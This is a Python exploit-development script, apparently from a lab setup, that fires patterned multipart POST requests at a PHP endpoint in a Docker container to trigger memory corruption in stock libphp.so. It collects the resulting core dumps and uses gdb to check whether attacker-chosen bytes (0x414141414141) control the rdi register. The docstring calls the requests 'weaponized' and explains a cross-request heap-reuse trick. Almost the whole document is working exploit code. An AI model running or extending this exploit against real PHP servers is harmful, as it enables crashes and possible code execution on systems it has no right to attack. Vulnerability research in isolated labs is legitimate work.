#!/usr/bin/env python3
"""oom69b: ALL-patterned sequence — prove value-byte control of rdi.

Finding from 69a: rdi stayed 0x4b4b.. even in weaponized fires because
warm-up/sacrifice bodies were K-filled and mod_php reuses their freed
slabs across requests (cross-request reclaim). Fix: EVERY body in the
sequence carries the C pattern (target_obj=0x414141414141), so no K
bytes exist in the child at crash time. Expect rdi = C-window
(41/7a mix) in every core. Decode rdi after EACH crash; two-hop
docker cp via host (container->container cp silently no-ops).
"""
import re
import subprocess
import time
import urllib.request

import payload68 as P

LAB = "http://127.0.0.1:8081"
TGT = 0x414141414141


def sh(cmd, timeout=60):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1", "replace").strip()


def post(att):
    req = urllib.request.Request(LAB + "/oom_mod.php", data=att,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return "200", r.read(120).decode("latin1", "replace")
    except Exception as e:
        return type(e).__name__, str(e)[:40]


def decode_newest_core(tag):
    """Two-hop copy host-side, gdb rdi in phpbuild."""
    c = subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core_%s" % tag],
                       capture_output=True, timeout=120)
    if c.returncode != 0:
        print("    [core copy failed]", c.stderr.decode()[:80], flush=True)
        return
    subprocess.run(["docker", "cp", "/tmp/core_%s" % tag, "phpbuild:/tmp/core_%s" % tag],
                   capture_output=True, timeout=120)
    out = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                          "gdb -q -batch -x /tmp/g69.gdb /tmp/libphp.stock.so /tmp/core_%s 2>&1 | grep -E '^rdi|zend_array_destroy' | head -3" % tag],
                         capture_output=True, timeout=120)
    print(out.stdout.decode("latin1", "replace").strip(), flush=True)


def main():
    print("[0] stock md5 + core env", flush=True)
    md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, "stock gone: %s" % md5
    sh("grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", "rm -f /tmp/core.69 /tmp/core.69b /tmp/core_*"],
                   capture_output=True)
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                    "printf 'bt 2\\ninfo registers rdi\\nquit\\n' > /tmp/g69.gdb"],
                   capture_output=True)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(30):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10):
            break
    print("    ready — ALL fires patterned with %012x" % TGT, flush=True)

    print("[1] warm (patterned)", flush=True)
    for i, k1 in enumerate(P.K1S[:-1]):
        code, _ = post(P.build_attack(k1, 7000000 + i * 100000, target_obj=TGT))
    print("    warm done", flush=True)

    print("[2] sacrifice + finishers (patterned), decode rdi per crash", flush=True)
    for fi in range(4):
        code, body = post(P.build_attack(3400, 7100000 + fi * 100000, target_obj=TGT))
        print("  fire%d: %s %r" % (fi, code, body[:40]), flush=True)
        if code != "200":
            time.sleep(2)
            decode_newest_core("f%d" % fi)
        else:
            print("    (survivor)", flush=True)

    print("[3] restore", flush=True)
    sh("rm -f /etc/apache2/conf-enabled/oomcore.conf")
    sh("sed -i '/ulimit -c/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(8)
    print("    restored:", sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10), flush=True)


if __name__ == "__main__":
    main()
